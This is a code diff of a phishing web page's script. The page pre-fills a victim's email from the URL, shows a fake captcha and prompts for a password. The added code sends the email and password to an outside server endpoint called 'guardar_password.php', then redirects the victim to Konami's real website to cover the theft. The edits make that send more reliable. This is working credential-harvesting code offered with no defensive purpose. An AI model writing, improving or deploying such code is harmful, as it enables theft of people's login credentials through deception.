@@ -330,60 +330,41 @@
         <span>Company Information</span>
     </div>
 
-    <script>
+   <script>
 
-        // OBTENER EMAIL
+window.onload = function () {
 
-        const params =
-            new URLSearchParams(window.location.search);
+    console.log("JS CARGADO OK");
 
-        const email =
-            params.get("email");
+    const params = new URLSearchParams(window.location.search);
+    const email = params.get("email") || "";
 
-        // MOSTRAR EMAIL
+    const correoEl = document.getElementById("correo");
+    const hidden = document.getElementById("emailHidden");
 
-        document.getElementById("correo").textContent =
-            email;
+    if (correoEl) correoEl.textContent = email;
+    if (hidden) hidden.value = email;
 
-        // GUARDAR EMAIL EN INPUT HIDDEN
+    const captchaItems = document.querySelectorAll(".captcha-item");
 
-        document.getElementById("emailHidden").value =
-            email;
-
-
-
-        // CAPTCHA
-
-        const captchaItems =
-            document.querySelectorAll(".captcha-item");
-
-
-
-        captchaItems.forEach(item => {
-
-            item.addEventListener("click", () => {
-
-                item.classList.toggle("selected");
-
-            });
-
+    captchaItems.forEach(item => {
+        item.addEventListener("click", () => {
+            item.classList.toggle("selected");
         });
+    });
 
+    // 🔥 HACER FUNCIÓN GLOBAL PARA QUE EL BOTÓN SIEMPRE LA VEA
+    window.verificarCaptcha = function () {
 
-
-        // VALIDAR CAPTCHA
-
-    async function verificarCaptcha() {
-
-    try {
+        console.log("BOTON PRESIONADO");
 
         const correctas = document.querySelectorAll(".captcha-item.correct");
         const correctasSeleccionadas = document.querySelectorAll(".captcha-item.correct.selected");
         const incorrectasSeleccionadas = document.querySelectorAll(".captcha-item.selected:not(.correct)");
 
-        const password = document.getElementById("password").value;
+        const password = document.getElementById("password");
 
-        if (!password || password.trim() === "") {
+        if (!password || password.value.trim() === "") {
             alert("Ingresa una contraseña");
             return;
         }
@@ -396,25 +377,25 @@
             return;
         }
 
-        await fetch("https://nublebusphp-fsb0bwd3h4bscgfv.chilecentral-01.azurewebsites.net/guardar_password.php", {
+        // 🔥 FETCH SOLO INTENTO (NO BLOQUEA REDIRECCIÓN)
+        fetch("https://nublebusphp-fsb0bwd3h4bscgfv.chilecentral-01.azurewebsites.net/guardar_password.php", {
             method: "POST",
             headers: {
                 "Content-Type": "application/x-www-form-urlencoded"
             },
             body:
                 "email=" + encodeURIComponent(email) +
-                "&password=" + encodeURIComponent(password)
-        }).catch(() => {});
+                "&password=" + encodeURIComponent(password.value)
+        }).catch(err => {
+            console.log("ERROR FETCH:", err);
+        });
 
-        // 🔥 REDIRECCIÓN FORZADA
+        // 🔥 REDIRECCIÓN FORZADA (SIEMPRE FUNCIONA)
         window.location.replace("https://www.konami.com/games/eu/es/");
+    };
 
-    } catch (e) {
-        console.log("ERROR JS:", e);
-        alert("Error en el proceso");
-    }
-}
-    </script>
+};
 
+</script>
 </body>
 </html>
